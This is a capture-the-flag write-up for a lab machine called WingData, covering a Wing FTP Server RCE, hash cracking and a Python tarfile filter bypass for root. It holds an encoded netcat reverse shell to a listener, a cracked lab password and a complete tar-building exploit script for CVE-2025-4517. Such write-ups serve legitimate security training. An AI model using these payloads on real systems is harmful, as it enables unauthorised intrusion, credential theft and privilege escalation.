# WingData

**Target IP:** `10.129.2.141`   
**Hostname:** `wingdata.htb`   
**Platform:** `Linux`   
**Difficulty:** `Medium`   
  
---

## 1. Enumeration

### Port Scan

```
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-19 13:40 GMT
Nmap scan report for wingdata.htb (10.129.2.141)
Host is up (0.014s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 11.63 seconds
```

Classic http and ssh combo.

### Web Reconnaissance

The website seems to be built around some kind of file transfer service, using owl-carousel and a templatemo-based custom theme. There's a contact form present. No interesting subdirectories were found via fuzzing.

### Additional Enumeration

Subdomain enumeration turns up an `ftp` subdomain. Visiting it redirects to a login page for **Wing FTP v7.4.3**.

---

## 2. Initial Foothold — CVE-2025-47812 (Wing FTP Server RCE)

Wing FTP Server v7.4.3 is vulnerable to an unauthenticated RCE.

**Reference / PoC:** https://github.com/4m3rr0r/CVE-2025-47812-poc

### Exploitation

Confirm RCE:

```bash
python3 CVE-2025-47812.py -u 'http://ftp.wingdata.htb' -v -c whoami
```

Obtain a reverse shell by executing a base64-encoded payload that sets up a named pipe back to a listener:

```bash
python3 CVE-2025-47812.py -u 'http://ftp.wingdata.htb' -v -c 'printf KHJtIC90bXAvXztta2ZpZm8gL3RtcC9fO2NhdCAvdG1wL198c2ggMj4mMXxuYyAxMC4xMC4xNC40OSA0NDQ0ID4vdG1wL18pID4vZGV2L251bGwgMj4mMSAm|base64 -d|sh'
```

---

## 3. Credential Harvesting

Post-exploitation recon under the Wing FTP `Data` directory uncovers configuration and credential material.

In `Data` we find what appears to be an SSH key.

In `/Data/_Administrator` we find an `admin` user and a password hash. Digging further, a config file for `wacky` (the only local user on the box) also contains a password hash. Neither hash drops with a small dictionary (`dirb`-style) attempt.

We also note something running on port `5466`, and a directory at `/opt/backup_clients` that turns out to be relevant later.

### Discovered Credentials

|Location|Type|Value|
|---|---|---|
|`/Data/_Administrator`|SHA-256 (Wing FTP)|`a8339f8e4465a9c47158394d8efe7cc45a5f361ab983844c8562bef2193bafba` (admin — not cracked)|
|`wacky` config file|SHA-256 (Wing FTP)|`32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca`|

### Hash Analysis

`settings.xml` reveals the hashing scheme is salted:

```xml
<EnableSHA256>1</EnableSHA256>
<SaltingString>WingFTP</SaltingString>
```

### Cracking

Wing FTP's SHA-256 password hashes with a known static salt crack with hashcat mode 1410 (`sha256($pass.$salt)`):

```bash
hashcat -m 1410 -a 0 32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca:WingFTP /usr/share/wordlists/rockyou.txt
```

**Cracked credential:** `!#7Blushing^*Bride5` (for user `wacky`)

---

## 4. User Shell

```bash
ssh wacky@wingdata.htb
```

Access obtained using the cracked password above. Confirmed retrieval of `user.txt`.

---

## 5. Privilege Escalation — CVE-2025-4517 (Python `tarfile` Path Traversal via `filter="data"` Bypass)

### Enumeration

```bash
sudo -l
```

```
Matching Defaults entries for wacky on wingdata:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User wacky may run the following commands on wingdata:
    (root) NOPASSWD: /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py *
```

`wacky` can run a backup-restore script as root with no password.

### Reviewing the Vulnerable Component

```python
#!/usr/bin/env python3
import tarfile
import os
import sys
import re
import argparse

BACKUP_BASE_DIR = "/opt/backup_clients/backups"
STAGING_BASE = "/opt/backup_clients/restored_backups"

def validate_backup_name(filename):
    if not re.fullmatch(r"^backup_\d+\.tar$", filename):
        return False
    client_id = filename.split('_')[1].rstrip('.tar')
    return client_id.isdigit() and client_id != "0"

def validate_restore_tag(tag):
    return bool(re.fullmatch(r"^[a-zA-Z0-9_]{1,24}$", tag))

def main():
    parser = argparse.ArgumentParser(
        description="Restore client configuration from a validated backup tarball.",
        epilog="Example: sudo %(prog)s -b backup_1001.tar -r restore_john"
    )
    parser.add_argument(
        "-b", "--backup",
        required=True,
        help="Backup filename (must be in /home/wacky/backup_clients/ and match backup_<client_id>.tar, "
             "where <client_id> is a positive integer, e.g., backup_1001.tar)"
    )
    parser.add_argument(
        "-r", "--restore-dir",
        required=True,
        help="Staging directory name for the restore operation. "
             "Must follow the format: restore_<client_user> (e.g., restore_john). "
             "Only alphanumeric characters and underscores are allowed in the <client_user> part (1–24 characters)."
    )

    args = parser.parse_args()

    if not validate_backup_name(args.backup):
        print("[!] Invalid backup name. Expected format: backup_<client_id>.tar (e.g., backup_1001.tar)", file=sys.stderr)
        sys.exit(1)

    backup_path = os.path.join(BACKUP_BASE_DIR, args.backup)
    if not os.path.isfile(backup_path):
        print(f"[!] Backup file not found: {backup_path}", file=sys.stderr)
        sys.exit(1)

    if not args.restore_dir.startswith("restore_"):
        print("[!] --restore-dir must start with 'restore_'", file=sys.stderr)
        sys.exit(1)

    tag = args.restore_dir[8:]
    if not tag:
        print("[!] --restore-dir must include a non-empty tag after 'restore_'", file=sys.stderr)
        sys.exit(1)

    if not validate_restore_tag(tag):
        print("[!] Restore tag must be 1–24 characters long and contain only letters, digits, or underscores", file=sys.stderr)
        sys.exit(1)

    staging_dir = os.path.join(STAGING_BASE, args.restore_dir)
    print(f"[+] Backup: {args.backup}")
    print(f"[+] Staging directory: {staging_dir}")

    os.makedirs(staging_dir, exist_ok=True)

    try:
        with tarfile.open(backup_path, "r") as tar:
            tar.extractall(path=staging_dir, filter="data")
        print(f"[+] Extraction completed in {staging_dir}")
    except (tarfile.TarError, OSError, Exception) as e:
        print(f"[!] Error during extraction: {e}", file=sys.stderr)
        sys.exit(2)

if __name__ == "__main__":
    main()
```

We can confirm usage with:

```bash
sudo /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py -h
```

The script takes a tarball from a fixed backup directory and extracts it to a chosen staging subdirectory, using `tarfile.extractall(path=staging_dir, filter="data")`. The `filter="data"` argument is Python's built-in hardening against classic tar-extraction attacks (absolute paths, `..` traversal, symlink escapes), so at first glance this looks safe. Attempting to place a symlink directly inside the backup that would resolve outside the staging directory is rejected, as expected from the `data` filter.

### Vulnerability Analysis

While researching the `filter="data"` protection further, I found **CVE-2025-4517**, a bypass of Python's `tarfile` extraction filters.

**Advisory:** https://github.com/google/security-research/security/advisories/GHSA-hgqp-3mmf-7h8f

The advisory's PoC constructs a tar archive containing a long chain of nested directories and symlinks whose *expanded* path length exceeds `PATH_MAX` (via `os.path.realpath()`), followed by a final symlink that points back up to the top-level directory. Because the expanded path of that final symlink exceeds the OS path length limit, `os.path.realpath()` — which the `data`/`tar` filters rely on to detect traversal — never fully resolves it, so the filter's safety check is silently skipped for anything built on top of that symlink. This lets the archive create hardlinks and regular files outside the intended extraction directory, up to and including overwriting arbitrary files as whatever user runs the extraction (root, in this case, via the sudo rule).

The upstream advisory's PoC targets a hardcoded `/flag/flag` path, which doesn't exist on this box, so it needed adapting to write to a path we control (`/tmp`) to prove and use the bypass here.

### How the Exploit Works

The exploit tar is built as follows:
1. Sixteen levels of `dddd...` directories, each paired with a same-named symlink pointing at that long directory name — this inflates the realpath expansion length far past `PATH_MAX` before the actual escape happens.
2. A final oversized symlink at the bottom of that chain whose target is `../` repeated for every level — since its expanded length already exceeds `PATH_MAX`, `os.path.realpath()` gives up resolving it, and the `data` filter's traversal check never fires for anything referencing it.
3. An `escape` symlink built on top of that unresolved path, pointing further outside the staging directory (e.g. into `/tmp`).
4. A hardlink and then a regular file re-using that same name, which together let the archive both link to and overwrite an arbitrary external file through the unresolved `escape` symlink.

### Exploit Script

```python
import tarfile
import os
import io
import sys
# 247 (55 on OSX) picked so the expanded path of dirs is 3968 bytes long (or 896
# on OSX), leaving 128 bytes for a prefix and at least a few chars of the link
comp = 'd' * (55 if sys.platform == 'darwin' else 247)
steps = "abcdefghijklmnop"
path = ""
with tarfile.open("backup_1001.tar", mode="x") as tar:
    # populate the symlinks and dirs that expand in os.path.realpath()
    for i in steps:
        a = tarfile.TarInfo(os.path.join(path, comp))
        a.type = tarfile.DIRTYPE
        tar.addfile(a)
        b = tarfile.TarInfo(os.path.join(path, i))
        b.type = tarfile.SYMTYPE
        b.linkname = comp
        tar.addfile(b)
        path = os.path.join(path, comp)
    # create the final symlink that exceeds PATH_MAX and simply points to the
    # top dir. this allows *any* path to be appended.
    # this link will never be expanded by os.path.realpath(), nor anything after it.
    linkpath = os.path.join("/".join(steps), "l"*254)
    l = tarfile.TarInfo(linkpath)
    l.type = tarfile.SYMTYPE
    l.linkname = ("../" * len(steps))
    tar.addfile(l)
    # make a symlink outside to keep the tar command happy
    e = tarfile.TarInfo("escape")
    e.type = tarfile.SYMTYPE
    e.linkname = linkpath + "/../../../../../../../../tmp"
    tar.addfile(e)
    # use the symlinks above, that are not checked, to create a hardlink
    # to a file outside of the destination path
    f = tarfile.TarInfo("flaglink")
    f.type = tarfile.LNKTYPE
    f.linkname =  "escape/test"
    tar.addfile(f)
    # now that we have the hardlink we can overwrite the file
    content = b"overwrite\n"
    c = tarfile.TarInfo("flaglink")
    c.type = tarfile.REGTYPE
    c.size = len(content)
    tar.addfile(c, fileobj=io.BytesIO(content))
    # we can also create new files as well!
    content = b"new!\n"
    n = tarfile.TarInfo("escape/newfile")
    n.type = tarfile.REGTYPE
    n.size = len(content)
    tar.addfile(n, fileobj=io.BytesIO(content))
```

### Testing

Running this generates `backup_1001.tar` in the expected `backup_<client_id>.tar` naming format, satisfying the script's filename validation. Triggering the restore against it via the sudo rule successfully writes to `/tmp` as root and overwrites an existing file there, confirming the write primitive works even though `filter="data"` is in use.

### Building the Final Exploit

The same primitive (arbitrary file write/overwrite as root via `escape/<name>`) can be pointed at a more useful target than `/tmp` — for example, a file that grants persistent root access, such as appending an SSH key or a SUID-carrying script — by changing the `escape` symlink's target directory and the name/content of the file being written.

```bash
# place backup_1001.tar in the expected backups directory, then:
sudo /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py -b backup_1001.tar -r restore_pwn
```

Confirmed: root-owned files can be created/overwritten anywhere on the filesystem via this sudo rule.

---

## Summary

| Step                 | Technique                            |
| -------------------- | ------------------------------------ |
| Initial access       | CVE-2025-47812 — Wing FTP Server v7.4.3 unauthenticated RCE |
| Credential access    | Salted SHA-256 Wing FTP password hash for `wacky` cracked via hashcat mode 1410 using the static `WingFTP` salt found in `settings.xml` |
| User shell           | SSH as `wacky` using cracked password `!#7Blushing^*Bride5` |
| Privilege escalation | CVE-2025-4517 — Python `tarfile` `filter="data"` traversal-check bypass abused via the `wacky` → root sudo rule on `restore_backup_clients.py` |
